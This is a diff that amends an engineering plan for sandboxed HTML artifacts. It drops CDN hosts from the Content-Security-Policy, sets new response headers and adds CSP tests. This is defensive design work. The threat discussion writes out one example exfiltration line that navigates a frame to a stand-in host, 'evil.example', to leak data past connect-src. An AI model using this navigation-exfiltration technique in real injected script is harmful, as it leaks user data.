@@ -684,3 +684,47 @@ Stop and report back (do not improvise) if:
   leaking cross-workspace ids, and that no code path calls
   `dangerouslySetInnerHTML`-equivalent HTML injection on the API side
   (responses are byte streams, never templated).
+
+## Amendment (plan 070, 2026-07-07): no CDN hosts in the artifact CSP
+
+Where this block conflicts with the text above, this block wins.
+
+- **Decision 7 is superseded.** `cdn.jsdelivr.net` and `unpkg.com` serve
+  every npm package under attacker-choosable paths, which the Maintenance
+  notes' own rule ("reject any host that serves user-controllable paths")
+  forbids. v1 ships **no external hosts** in the artifact CSP:
+  `ARTIFACT_CSP_CDN_HOSTS = ()` (keep the constant — it is the seam for a
+  future self-hosted `/artifacts/vendor/` path-scoped source; a
+  general-purpose CDN host must never be added to it).
+- **Decision 8 clarification / "phone home" correction.** The
+  `sandbox allow-scripts` directive (no `allow-top-navigation`, no
+  `allow-popups`) blocks top-frame navigation and popups, but a frame can
+  always navigate itself: `location.href = "https://evil.example/?d=..."`
+  exfiltrates via the navigation URL despite `connect-src 'none'`, and no
+  shipped CSP directive closes it (`navigate-to` never shipped). Read
+  decision 7's "cannot phone home" as "cannot *silently* phone home";
+  navigation exfil by injected inline script is the accepted residual,
+  which is why `script-src` admits no third-party code to amplify it.
+- **Step 5 HTML header block becomes:**
+
+  ```
+  Content-Type: text/html; charset=utf-8
+  Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; connect-src 'none'; frame-ancestors {app_origins}; base-uri 'none'; form-action 'none'; object-src 'none'; sandbox allow-scripts
+  X-Content-Type-Options: nosniff
+  Referrer-Policy: no-referrer
+  Cache-Control: no-store
+  ```
+
+  Non-HTML header blocks are unchanged. HTML artifacts are self-contained:
+  inline script/style only, assets as `data:`/`blob:`.
+- **Step 7 / test plan additions**: the CSP byte-match uses the string
+  above; add a structural test parsing the built policy and asserting
+  `script-src`, `style-src`, `font-src`, `img-src`, and `connect-src`
+  contain no scheme-and-host source (keyword/`data:`/`blob:` tokens only;
+  `frame-ancestors` alone may carry origins), and that neither
+  `cdn.jsdelivr.net` nor `unpkg.com` appears anywhere in the policy.
+- **Maintenance note "CDN whitelist growth" is superseded**: external
+  script sources may only ever arrive via pinned, vetted, checked-in
+  bundles served from the artifact origin under `/artifacts/vendor/`
+  (path-scoped CSP source) — never a third-party host. The remote
+  `img-src` / `connect-src` prohibition stands unchanged.
